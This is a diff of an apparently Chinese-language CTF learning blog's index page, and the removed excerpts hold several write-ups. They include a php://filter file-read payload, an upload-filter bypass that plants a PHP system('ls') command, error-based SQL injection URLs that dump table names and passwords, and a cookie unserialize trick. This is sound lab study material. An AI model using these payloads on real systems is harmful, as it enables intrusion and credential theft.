@@ -155,6 +155,71 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-15th-day" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/08/14/15th-day/">15th-day</a>
+    </h1>
+  
+
+        
+        <a href="/2019/08/14/15th-day/" class="archive-article-date">
+  	<time datetime="2019-08-14T01:03:55.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-14</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>40.SKCTF管理系统(<a href="http://123.206.31.85:49163/" title="SKCTF管理系统()" target="_blank" rel="noopener">http://123.206.31.85:49163/</a>)<br>&emsp;&emsp;进入页面后是一个管理系统的登陆界面，这里没有账号和密码先去注册一个，任意注册一个后提示不是管理员还想得到flag,太真实了，这里可以想到题目中提示了是约束攻击因而先去了解一下约束攻击
+        
+          <a class="article-more-a" href="/2019/08/14/15th-day/#more">more >></a>
+        
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/08/14/15th-day/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-14th-day" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -175,8 +240,10 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>39.文件包含2(<a href="http://123.206.31.85:49166/index.php?file=hello.php" title="文件包含2" target="_blank" rel="noopener">http://123.206.31.85:49166/index.php?file=hello.php</a>)<br>&emsp;&emsp;进入页面后，是一个hello.php提示里面也说过文件包含，并且可以看到url中有个file=因而应该可以用php流读取文件，先最基本的看一下源代码和网络有没有其他提示。无其他提示，因而直接php流，payload:?file=php://filter/read=convert.base64-encode/resource=hello.php  链接回车后会出现h1标记的naive，说我幼稚哼哼，查看源代码发现注释的upload.php，打开它发现了文件上传的页面，任然是只允许上传Jpg gif png 格式的文件。那就接着上传我的yijuhua.jpg，再用bp抓包看看，跟上次的那个包长得一模一样，那我先一模一样改着试试。回忆一下这种上传过滤会过滤掉不对的文件类型以及会过率掉content-type头文件中的。Content-Type: multipart/form-data;这儿mUltipart采用大小写绕过它。然后上传的文件肯定得改成php才能解析先试试上次得php5.还是说只允许上传jpg，我把数据部分得content-type也改为php试试，也不行，试试0x0截断，采用yijuhua.php.jpg得方式中间用0x0相连，采用0x0截断任然被读取出是上传非法，这道题应当是白名单机制，因而在我尝试其他各种php4，php5等都是非法的，再试试其他途径绕过。在其他人的wp上看到了构造命令执行:<script language="php">system("ls")</script>上传文件的后缀名为.php;.jpg这里我有些疑惑等会儿解决我先试试这种方式。上传后，打开图片路径的网页，显示了一串this_is_flag.txt的文件直接打开拿下flag.这道题我做的懵懵懂懂的现在来一探究竟。<br>&emsp;&emsp;这种方式是用来列出当前目录的。采用script标签。<br>文件包含的漏洞原理:在通过服务器脚本的函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，导致任意的文件泄露甚至恶意的代码注入。<br>require()<br>require_once()<br>include()<br>include_once() 这些都是容易产生文件包含漏洞的函数，其他的相关原理下来接着掌握，先到这里，等会儿接着做。</p>
-
+        <p>39.文件包含2(<a href="http://123.206.31.85:49166/index.php?file=hello.php" title="文件包含2" target="_blank" rel="noopener">http://123.206.31.85:49166/index.php?file=hello.php</a>)<br>&emsp;&emsp;进入页面后，是一个hello.php提示里面也说过文件包含，并且可以看到url中有个file=因而应该可以用php流读取文件，先最基本的看一下源代码和网络有没有其他提示。无其他提示，因而直接php流
+        
+          <a class="article-more-a" href="/2019/08/13/14th-day/#more">more >></a>
+        
       
 
       
@@ -225,7 +292,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2019/08/12/13th-day/">thirdth-day</a>
+      <a class="article-title" href="/2019/08/12/13th-day/">13th-day</a>
     </h1>
   
 
@@ -238,31 +305,10 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>&emsp;&emsp;关于报错注入的一些小总结:MySQL 5.1.5版本中添加了对XML文档进行查询和修改的两个函数：extractvalue、updatexml.ExtractValue() 使用XPath表示法从XML字符串中提取值<br>UpdateXML()     返回替换的XML片段<br>举例其用法:<br>emsp;&emsp;先从爆库开始:<br><a href="http://219.153.49.228:49919/new\_list.php?id=1&#39;" target="_blank" rel="noopener">http://219.153.49.228:49919/new\_list.php?id=1&#39;</a> and extractvalue(1,concat(0x7e,(database()),0x7e))--+<br>emsp;&emsp;然后开始爆表:<br><a href="http://219.153.49.228:49919/new\_list.php?id=1&#39;" target="_blank" rel="noopener">http://219.153.49.228:49919/new\_list.php?id=1&#39;</a> and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database() limit 0,1 ),0x7e))--+<br>&emsp;&emsp;然后开始爆表里的字段：<br><a href="http://219.153.49.228:49919/new\_list.php?id=1%27%20and%20extractvalue" target="_blank" rel="noopener">http://219.153.49.228:49919/new\_list.php?id=1%27%20and%20extractvalue</a>(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=’member’ ),0x7e))–+<br>emsp;&emsp;最后爆表里的数据:<br><a href="http://219.153.49.228:49919/new\_list.php?id=1%27%20and%20extractvalue" target="_blank" rel="noopener">http://219.153.49.228:49919/new\_list.php?id=1%27%20and%20extractvalue</a>(1,concat(0x7e,(select group_concat(password) from member ),0x7e))–+<br>emsp;&emsp;基本上就是and extractvalue(1,concat(0x7e,(查询语句),0x7e))最后可以用–+，也就是注释加符号的用法隔开最后的引号。<br>37.PHP_encrypt_1(ISCCCTF)<br>&emsp;&emsp;这道题没有链接，进去只有一个fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=<br>和一个文件，先将这个base64解密看一下。解码以后是乱码，先不管这个打开提示文件看一下。解压后是一个php文件，本地运行看一下。这儿由于它叫index.php因而直接打开了打开后是空白的,直接看代码如下所示:<br><?php
-function encrypt($data,$key)
-{
-    $key = md5('ISCC');
-    $x = 0;
-    $len = strlen($data);
-    $klen = strlen($key);
-    for ($i=0; $i < $len; $i++) { 
-        if ($x == $klen)
-        {
-            $x = 0;
-        }
-        $char .= $key[$x];
-        $x+=1;
-    }
-    for ($i=0; $i < $len; $i++) {
-        $str .= chr((ord($data[$i]) + ord($char[$i])) % 128);
-    }
-    return base64\_encode($str);
-}
-?><br>上诉ord是返回字符串首字母的ascii值，然后strlen是返回字符串的长度。整个函数是一个加密函数，首先key的值是ISCC的md5加密，<br>md5(ISCC,32) = 729623334f0aa2784a1599fd374c120d<br>md5(ISCC,16) = 4f0aa2784a1599fd<br>这里有两种长度,但php的md5运行后是32位的因而舍弃16位情况。那么klen=32,data可能就是给出的那个数据是52位。现在直接将数字带入进去运行php试试。在一顿操作猛如虎后发现并没有效，在查看他人大量博文后发现自己理解错了题目意思，这道题是让自己写出解密函数按照加密函数的逆解出给出长串密文的对应明文即为key，由于个人能力不足此题暂放，后面来补。<br>38.flag.php(<a href="http://123.206.87.240:8002/flagphp/" title="flag.php" target="_blank" rel="noopener">http://123.206.87.240:8002/flagphp/</a>)<br>&emsp;&emsp;进入页面后发现是一个登陆框，但是任意输入数字点了登陆没反应，我想抓包试试。我发现这个Login可能本来就是个假的提交框，按了之后没有任何反应BP也接受不到提交包。题目最开始提示了一个hint，这个Hint就是暗示的意思但是去哪里找hint以及它是用来做什么的呢。<br>input value=”Login” type=”button”源代码中可以看到这就是个按钮框没有提交作用。再看哈有没有其他线索。一切都只给了一个hint,这种登陆框一般是sql注入，hint难道是用来传参的像id一样？试试/?hint=1,居然给出了大片的源代码。好了应该是代码审计了。<br>error_reporting(0);<br>include_once(“flag.php”);<br>$cookie = $_COOKIE[‘ISecer’];<br>if(isset($_GET[‘hint’])){<br>    show_source(_<em>FILE_</em>);<br>}<br>elseif (unserialize($cookie) === “$KEY”)<br>{<br>    echo “$flag”;<br>}<br><?php
-}
-$KEY='ISecer:www.isecer.com';
-?><br>也就是如果cookie的反序列化=key就输出flag.之前有做过反序列化的题，先去温习一哈。由于下面是一个单独的PHP因而上面的$key=””,因而先求的””的序列化为s:0:””;由于;再cookie中是不会正确上传到服务器的因而可以使用其Url编码%3B或者不写;进入BP后添加Cookie: ISecer=<br>s:0:””发包即可获得flag.<br>&emsp;&emsp;summary: 这道题主要要理清序列化和反序列化的关系，将一个序列化的东西再反序列化得到的就是序列化之前的东西，理解了这一点这道理就迎刃而解了。</p>
-
+        <p>&emsp;&emsp;关于报错注入的一些小总结:MySQL 5.1.5版本中添加了对XML文档进行查询和修改的两个函数：extractvalue、updatexml.ExtractValue() 使用XPath表示法从XML字符串中提取值<br>UpdateXML()     返回替换的XML片段<br>举例其用法:<br>emsp;&emsp;先从爆库开始
+        
+          <a class="article-more-a" href="/2019/08/12/13th-day/#more">more >></a>
+        
       
 
       
@@ -744,71 +790,6 @@ echo "<p>sorry!</p>";
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2019/08/04/sixth-day/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-fifth-day" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/08/03/fifth-day/">fifth-day</a>
-    </h1>
-  
-
-        
-        <a href="/2019/08/03/fifth-day/" class="archive-article-date">
-  	<time datetime="2019-08-03T01:35:04.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-03</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>16.web4(<a href="http://123.206.87.240:8002/web4/" title="web4" target="_blank" rel="noopener">http://123.206.87.240:8002/web4/</a>)<br>&emsp;&emsp;进入页面后，提示我们查看源代码？那好咱先查看源代码。<br>在script标签中发现如下所示的代码：
-        
-          <a class="article-more-a" href="/2019/08/03/fifth-day/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/08/03/fifth-day/">展开全文 >></a>
         </p>
       
 
